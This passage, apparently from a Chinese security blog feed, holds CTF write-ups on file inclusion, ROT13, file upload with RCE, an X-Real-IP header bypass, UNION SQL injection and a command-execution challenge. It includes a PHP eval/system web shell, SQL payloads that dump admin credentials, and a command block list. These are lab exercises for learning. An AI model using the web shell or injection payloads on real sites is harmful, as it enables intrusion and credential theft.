punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>假如网站中有phpinfo.php文件，攻击者可以构造<code>?file=phpinfo.php</code>的payload进行读取敏感文件。</p><h2 id="漏洞检测"><a href="#漏洞检测" class="headerlink" title="漏洞检测"></a>漏洞检测</h2><p>1、白盒：进行代码审计</p><p>2、黑盒：漏扫工具，公开漏洞，手工看参数值及功能点</p><h2 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h2><p>1、<strong>本地文件包含</strong>（读取本地的敏感文件）<br><code>file://C:\Windows\System32\drivers\etc\hosts</code> 本地DNS存在<br><code>file://D:\software\phpStudy\PHPTutorial\php\php-5.4.45\php.ini php</code>的配置文件<br><code>file://D:\software\phpStudy\PHPTutorial\Apache\conf\httpd.conf http</code>的配置文件<br><code>file://D:\software\phpStudy\PHPTutorial\MySQL\my.ini</code> 数据库的配置文件</p><p><strong>当本地包含有限制的情况下常用绕过姿势：</strong><br>1、%00截断：</p><p>条件：magic_quotes_gpc&#x3D;Off，php版本&lt;5.3.4</p><p>filename&#x3D;..&#x2F;..&#x2F;..&#x2F;xxx.txt</p><p>2、长度截断：</p><p>条件：windows，点号<code>（.）</code>需要长于256；linux长于4096</p><p>（相当于垃圾数据填充；由于命名过长会导致有限制的后缀名加不上来，导致绕过限制）</p><p>2、<strong>远程文件包含</strong><br>一般情况下，远程文件包含的都是TXT文件，可以直接使用远程文件包含包含一句话木马，或者利用文件包含写入一句话木马(单引号)<br>必须开启<code>php.ini</code>中的<code>allow_url_include</code>才能使用远程包含<code>http://IP地址/文件名</code></p><p><strong>远程包含有限制基本绕过姿势：</strong></p><p>1、加%20</p><p>2、加%23</p><p>3、？</p><p>4、……</p><h2 id="伪协议"><a href="#伪协议" class="headerlink" title="伪协议"></a>伪协议</h2><p><img src="/2022/03/20/%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/image-20220320183939141.png" alt="image-20220320183939141"></p><p>参考文章：<br><a href="https://blog.csdn.net/DARKNOTES/article/details/118660183">https://blog.csdn.net/DARKNOTES/article/details/118660183</a></p><p><a href="https://www.cnblogs.com/endust/p/11804767.html">https://www.cnblogs.com/endust/p/11804767.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 文件包含 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件包含 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-Crypto-看我回旋踢</title>
      <link href="/2022/03/19/BUU-Crypto-%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2/"/>
      <url>/2022/03/19/BUU-Crypto-%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记一次BUU密码学的CTF题目：看我回旋踢。不是很擅长密码学这一个方向，简单记录一下，毕竟计算机最后都不分家嘛。</p><h2 id="0x00-启动靶场"><a href="#0x00-启动靶场" class="headerlink" title="0x00 启动靶场"></a>0x00 启动靶场</h2><p>启动靶场下载压缩包，解压得到一串字符串</p><p><img src="/2022/03/19/BUU-Crypto-%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2/image-20220319221415074.png" alt="image-20220319221415074"></p><p><img src="/2022/03/19/BUU-Crypto-%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2/image-20220319221443265.png" alt="image-20220319221443265"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p><code>synt&#123;5pq1004q-86n5-46q8-o720-oro5on0417r1&#125;</code></p><p>首先看到会很懵，不知道这是什么编码，直接使用搜索引擎搜索synt编码会出现<code>rot13</code>的字样，再去搜索<code>rot13</code>会发现这是<code>rot13编码</code>。</p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>使用在线解密工具：<br><a href="http://www.rot13.de/index.php">http://www.rot13.de/index.php</a></p><p><img src="/2022/03/19/BUU-Crypto-%E7%9C%8B%E6%88%91%E5%9B%9E%E6%97%8B%E8%B8%A2/image-20220319222311444.png" alt="image-20220319222311444"></p><p>将字符串解密得到flag。</p><h2 id="0x03-ROT13编码"><a href="#0x03-ROT13编码" class="headerlink" title="0x03 ROT13编码"></a>0x03 ROT13编码</h2><p><code>ROT13</code>（回转13位，rotate by 13 places，有时中间加了个连字符称作ROT-13）是一种简易的替换式密码。</p><p><code>ROT13</code>被描述成“杂志字谜上下颠倒解答的Usenet点对点体”。ROT13 也是过去在古罗马开发的凯撒加密的一种变体。</p><p><strong>特点：</strong></p><p>套用ROT13到一段文字上仅仅只需要检查字元字母顺序并取代它在13位之后的对应字母， 有需要超过时则重新绕回26英文字母开头即可。</p><pre class="line-numbers language-none"><code class="language-none">ROT13函数是它自己的逆反：ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyzNOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-UPLOAD联合RCE</title>
      <link href="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/"/>
      <url>/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>BUU一道文件上传联合RCE的一道题。</p><h2 id="0x00-启动靶场"><a href="#0x00-启动靶场" class="headerlink" title="0x00 启动靶场"></a>0x00 启动靶场</h2><p>启动靶场提示上传文件，随便上传一个1.php文件，写入一句话，发现并没有做限制，可以任意文件上传，但上传之后会将文件名和后缀名修改为xxx.jpg的格式。</p><p><img src="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/image-20220318173443517.png" alt="image-20220318173443517"></p><p><img src="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/image-20220318173527061.png" alt="image-20220318173527061"></p><p>看到回显的路径。</p><p>试着访问，是空白页面，不知道是否能被执行。<br><img src="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/image-20220318173623676.png" alt="image-20220318173623676"></p><p>上传一个2.php，里面写入<code>Hello World!</code>看看效果</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php echo &#39;Hello World!&#39;; ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/image-20220318173847728.png" alt="image-20220318173847728"></p><p>可以看到文件被执行成功了，那么1.php也可以被执行成功。</p><p><strong>（我们上传之后 不能直接访问xxx&#x2F;uploads&#x2F;xxxxx.jpg 那样只是预览这个文件 而起不到调用这个文件的作用）</strong></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>但是使用蚁剑链接后可以连接成功，但是不能连接到文件目录</p><p><img src="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/image-20220318174008101.png" alt="image-20220318174008101"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>最后翻了几篇帖子，发现需要和RCE漏洞一起执行。</p><p>首先需要将一句话木马修改一下：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval(system($_POST[&quot;x&quot;]));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>注：</strong>这里使用<code>system()</code>函数的原因：（这也是为什么会联合RCE一起的原因）</p><p><img src="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/image-20220318174359421.png" alt="image-20220318174359421"></p><h2 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h2><p>最后将修改的1.php文件上传并访问（这里同样访问后是空白），但经过上面的测试可以知道上传的文件已经被执行成功。</p><p><img src="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/image-20220318174629288.png" alt="image-20220318174629288"></p><h2 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h2><p>接着将url放入到Postman中访问，并把Body的值修改为<code>x:ls /</code>，可以得到网站目录</p><p><img src="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/image-20220318174901586.png" alt="image-20220318174901586"></p><p>再修改为<code>x:cat /flag</code>，得到flag</p><p><img src="/2022/03/18/BUU-UPLOAD%E8%81%94%E5%90%88RCE/image-20220318175147535.png" alt="image-20220318175147535"></p><h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>这道题最主要的就是要知道虽然可以进行任意文件上传，但上传后的文件名和后缀名都被会重新修改，导致菜刀或者蚁剑可以连接成功，但不能够访问网站目录；其次就是要知道直接访问xxx.jpg文件只是去预览这个文件，而不是去调用这个文件，导致一句话不能被执行而失去作用，这个时候使用工Postman修改Body中参数，加入命令找到flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> RCE </tag>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-BURP-X-Real-IP</title>
      <link href="/2022/03/18/BUU-BURP-X-Real-IP/"/>
      <url>/2022/03/18/BUU-BURP-X-Real-IP/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>BUU一道BURP的题目，并记录一下X-Forwarded-For和X-Real-IP的区别。</p><h2 id="0x00-启动靶场"><a href="#0x00-启动靶场" class="headerlink" title="0x00 启动靶场"></a>0x00 启动靶场</h2><p>看到只能本地访问，一般看到这句话的时候肯定首先想到的是X-Forwarded-For，但是数据包中加了X-Forwarded-For也没什么作用，翻了几篇帖子看到需要用到X-Real-IP。</p><p><img src="/2022/03/18/BUU-BURP-X-Real-IP/image-20220318161302112.png" alt="image-20220318161302112"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>在数据包中加入<code>X-Real-IP：127.0.0.1</code>，看到有登录页面：<br><img src="/2022/03/18/BUU-BURP-X-Real-IP/image-20220318161558537.png" alt="image-20220318161558537"></p><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>接着点击登录即可获得flag：<br><img src="/2022/03/18/BUU-BURP-X-Real-IP/image-20220318161738452.png" alt="image-20220318161738452"></p><p><img src="/2022/03/18/BUU-BURP-X-Real-IP/image-20220318161801491.png" alt="image-20220318161801491"></p><h2 id="0x03-两者区别"><a href="#0x03-两者区别" class="headerlink" title="0x03 两者区别"></a>0x03 两者区别</h2><p>1、X-Forwarded-For：用于记录代理信息的，每经过一级代理(匿名代理除外)，代理服务器都会把这次请求的来源IP追加在X-Forwarded-For中</p><p>2、X-Real-IP：一般只记录真实发出请求的客户端IP</p><h2 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h2><p>了解<code>X-Forwarded-For</code>和<code>X-Real-IP</code>的区别；并且在本题中加入<code>X-Forwarded-For</code>同样也会把请求来源的IP追加在后面，导致请求的时候并不是使用<code>127.0.0.1</code>进行访问，这也是为什么<code>X-Forwarded-For</code>不能成功的原因，而使用<code>X-Real-IP</code>时，后台在检测的时候便是真实的127.0.0.1在访问。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUU-SQL注入-寻找注入点</title>
      <link href="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/"/>
      <url>/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>记录一下BUU的一道SQL注入，这道题难点主要在于寻找注入点。</p><h2 id="0x00-启动靶场"><a href="#0x00-启动靶场" class="headerlink" title="0x00 启动靶场"></a>0x00 启动靶场</h2><p>启动靶场后发现只有两个页面，一个是热点页面，一个是登录页面，开始以为登录页面存在注入，测试了很多，万能密码，甚至抓包修改Referer值探测注入点也都没有结果。</p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105309711.png" alt="image-20220318105309711"></p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105320103.png" alt="image-20220318105320103"></p><h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>登录页面无果后，测试了热点页面，有三篇新闻，随便开一片后发现url的值在变化：</p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105801150.png" alt="image-20220318105801150"></p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318105904675.png" alt="image-20220318105904675"></p><p>接着查看源码：</p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318110010310.png" alt="image-20220318110010310"></p><p>发现<code>content_detail.php</code>这里也有字段的变化，并且和url的<code>content</code>值相对应，那在这里就能大胆的猜测，<code>content字段</code>这里存在注入点。</p><h2 id="0x02-判断字段数"><a href="#0x02-判断字段数" class="headerlink" title="0x02 判断字段数"></a>0x02 判断字段数</h2><p>既然探测出了 注入点，那接下来就需要判断字段数：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 3http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;2 order by 2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318110444538.png" alt="image-20220318110444538"></p><p>当判断字段数为3时无回显，字段数为2时，回显正常页面，那这里字段数就是2.</p><h2 id="0x03-判断回显点"><a href="#0x03-判断回显点" class="headerlink" title="0x03 判断回显点"></a>0x03 判断回显点</h2><p>使用联合注入判断回显点：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318110613534.png" alt="image-20220318110613534"></p><h2 id="0x04-后续操作"><a href="#0x04-后续操作" class="headerlink" title="0x04 后续操作"></a>0x04 后续操作</h2><p>爆库：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(schema_name) from information_schema.schemata<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318111344733.png" alt="image-20220318111344733"></p><p>爆表：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112641585.png" alt="image-20220318112641585"></p><p>爆字段：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select 1,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;FLAG_TABLE&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112730085.png" alt="image-20220318112730085"></p><p>爆内容：</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;da703ef4-53ab-4c16-9c03-9413fff3b0ce.node4.buuoj.cn:81&#x2F;#&#x2F;content&#x2F;-2 union select group_concat(username),group_concat(password) from admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112104664.png" alt="image-20220318112104664"></p><p><strong>注：</strong>这里得到了管理员的账号和密码，在登录页面输入账号密码得到flag</p><p><img src="/2022/03/18/BUU-SQL%E6%B3%A8%E5%85%A5-%E5%AF%BB%E6%89%BE%E6%B3%A8%E5%85%A5%E7%82%B9/image-20220318112417918.png" alt="image-20220318112417918"></p><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>这道题最主要的难点在于寻找注入点，找到注入点之后，后续操作也就水到渠成了；其次就是信息搜集的重要性，若不花时间去信息搜集，在测试过程中往往很难继续往下进行。</p>]]></content>
      
      
      <categories>
          
          <category> SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>东塔靶场-CTF-命令执行_2</title>
      <link href="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/"/>
      <url>/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>东塔靶场一道关于MD5强类型的题目，感觉有点有趣，记录一下。</p><h2 id="0x00"><a href="#0x00" class="headerlink" title="0x00"></a>0x00</h2><p>打开靶场，提示有趣的md5，并且地址栏中像是被base64加密过</p><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316085212437.png" alt="image-20220316085212437"></p><p>查看源码，最可疑的是这张图片的地址，base64加密</p><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316085328265.png" alt="image-20220316085328265"></p><p>先解码，得到是<code>dota.png</code>这张图片</p><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316090806061.png" alt="image-20220316090806061"></p><h2 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h2><p>先将url解码试试</p><pre class="line-numbers language-none"><code class="language-none">解码前：TmpRMlpqYzBOakV5WlRjd05tVTJOdz09解码后：NjQ2Zjc0NjEyZTcwNmU2Nw&#x3D;&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解码后又是一个base64，再进行解码</p><pre class="line-numbers language-none"><code class="language-none">解码前：NjQ2Zjc0NjEyZTcwNmU2Nw&#x3D;&#x3D;解码后：646f74612e706e67<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>看着像16进制编码后的结果，试试16进制解码</p><pre class="line-numbers language-none"><code class="language-none">解码前：646f74612e706e67解码后：dota.png<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>解码完之后是<code>dotd.png</code>这张图片。</p><pre class="line-numbers language-none"><code class="language-none">那这里的逻辑应该是这样的：dota.png这张图片被三次编码之后放入地址栏中被解析成一张图片，结合上面将源码中的图片地址进行base64解码之后得到的正好是dota.png,那这里就不难理解了：url中将图片三次编码后，最后又被解析成了源码中的链接；而这里我们正好需要知道源码，那将index.php逆向的进行编码然后放入地址栏中，源码中就会出现index.php的源码链接，解码之后就是源码。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h2><p>将<code>index.php</code>进行逆向三次加密</p><pre class="line-numbers language-none"><code class="language-none">十六进制：696e6465782e706870第一次base64加密：Njk2ZTY0NjU3ODJlNzA2ODcw第二次base64加密：TmprMlpUWTBOalUzT0RKbE56QTJPRGN3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p> 然后将最终编码后的<code>index.php</code>放入地址栏中进行解析</p><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316091829007.png" alt="image-20220316091829007"></p><p>打开源码，复制<code>index.php</code>的链接进行base64解码</p><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316091946741.png" alt="image-20220316091946741"></p><p>得到源代码</p><p><img src="/2022/03/16/%E4%B8%9C%E5%A1%94%E9%9D%B6%E5%9C%BA-CTF-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-2/image-20220316092031938.png" alt="image-20220316092031938"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>将源码复制出来，进行代码审计</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;!DOCTYPE html&gt;&lt;!--[if lt IE 7]&gt; &lt;html class&#x3D;&quot;no-js lt-ie9 lt-ie8 lt-ie7&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;&lt;!--[if IE 7]&gt;    &lt;html class&#x3D;&quot;no-js lt-ie9 lt-ie8&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;&lt;!--[if IE 8]&gt;    &lt;html class&#x3D;&quot;no-js lt-ie9&quot; lang&#x3D;&quot;en&quot;&gt; &lt;![endif]--&gt;&lt;!--[if gt IE 8]&gt;&lt;!--&gt; &lt;html class&#x3D;&quot;no-js&quot; lang&#x3D;&quot;en&quot;&gt; &lt;!--&lt;![endif]--&gt;&lt;head&gt;  &lt;meta charset&#x3D;&quot;utf-8&quot; &#x2F;&gt;  &lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width&quot; &#x2F;&gt;  &lt;title&gt;dongta xueyuan&lt;&#x2F;title&gt;    &lt;!-- Included CSS Files (Uncompressed) --&gt;  &lt;!--  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;..&#x2F;stylesheets&#x2F;foundation.css&quot;&gt;  --&gt;    &lt;!-- Included CSS Files (Compressed) --&gt;   &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;stylesheets&#x2F;foundation.min.css&quot;&gt;  &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;&#x2F;stylesheets&#x2F;app.css&quot;&gt;  &lt;link rel&#x3D;&quot;icon&quot; href&#x3D;&quot;.&#x2F;dt.png&quot; type&#x3D;&quot;image&#x2F;x-icon&quot;&gt;  &lt;script src&#x3D;&quot;..&#x2F;javascripts&#x2F;modernizr.foundation.js&quot;&gt;&lt;&#x2F;script&gt;  &lt;!-- IE Fix for HTML5 Tags --&gt;  &lt;!--[if lt IE 9]&gt;    &lt;script src&#x3D;&quot;http:&#x2F;&#x2F;html5shiv.googlecode.com&#x2F;svn&#x2F;trunk&#x2F;html5.js&quot;&gt;&lt;&#x2F;script&gt;  &lt;![endif]--&gt;  &lt;link href&#x3D;&#39;http:&#x2F;&#x2F;fonts.googleapis.com&#x2F;css?family&#x3D;Open+Sans&#39; rel&#x3D;&#39;stylesheet&#39; type&#x3D;&#39;text&#x2F;css&#39;&gt;&lt;&#x2F;head&gt;&lt;body&gt;&lt;div class&#x3D;&quot;row&quot;&gt;&lt;div class&#x3D;&quot;four columns centered&quot;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;&lt;img src&#x3D;&quot;images&#x2F;dota.png&quot; &#x2F;&gt;&lt;&#x2F;a&gt;&lt;p&gt;&lt;fieldset&gt; &lt;style type&#x3D;&quot;text&#x2F;css&quot;&gt;        .org12        &#123;            color: #f60;        &#125;        .grey12        &#123;            color: #989898;        &#125;    &lt;&#x2F;style&gt; &lt;font class&#x3D;&quot;org12&quot;&gt;★★&lt;&#x2F;font&gt;&lt;font class&#x3D;&quot;grey12&quot;&gt;★&lt;&#x2F;font&gt;&lt;font class&#x3D;&quot;grey12&quot;&gt;&lt;&#x2F;font&gt;&lt;legend&gt;Details&lt;&#x2F;legend&gt;&lt;?phperror_reporting(E_ALL || ~ E_NOTICE);header(&#39;content-type:text&#x2F;html;charset&#x3D;utf-8&#39;);$cmd &#x3D; $_GET[&#39;cmd&#39;];if (!isset($_GET[&#39;tup&#39;]) || !isset($_GET[&#39;cmd&#39;]))     header(&#39;Refresh:0;url&#x3D;.&#x2F;index.php?tup&#x3D;TmpRMlpqYzBOakV5WlRjd05tVTJOdz09&amp;cmd&#x3D;&#39;);$file &#x3D; hex2bin(base64_decode(base64_decode($_GET[&#39;tup&#39;])));$file &#x3D; preg_replace(&quot;&#x2F;[^a-zA-Z0-9.]+&#x2F;&quot;, &quot;&quot;, $file);if (preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $file)) &#123;    echo &#39;&lt;img src &#x3D;&quot;.&#x2F;ctf3.jpeg&quot;&gt;&#39;;    die(&quot;这里没有flag&quot;);&#125; else &#123;    $txt &#x3D; base64_encode(file_get_contents($file));    echo &quot;&lt;br&#x2F;&gt;&lt;img src&#x3D;&#39;data:image&#x2F;gif;base64,&quot; . $txt . &quot;&#39;&gt;&lt;&#x2F;img&gt;&quot;;    echo &quot;&lt;br&gt;&quot;;&#125;echo $cmd;echo &quot;&lt;br&gt;&quot;;if (preg_match(&quot;&#x2F;ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\&#39;|\&quot;|\&#96;|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;&#x2F;i&quot;, $cmd)) &#123;    echo(&quot;forbid ~&quot;);    echo &quot;&lt;br&gt;&quot;;&#125; else &#123;    if ((string)$_POST[&#39;a&#39;] !&#x3D;&#x3D; (string)$_POST[&#39;b&#39;] &amp;&amp; md5($_POST[&#39;a&#39;]) &#x3D;&#x3D;&#x3D; 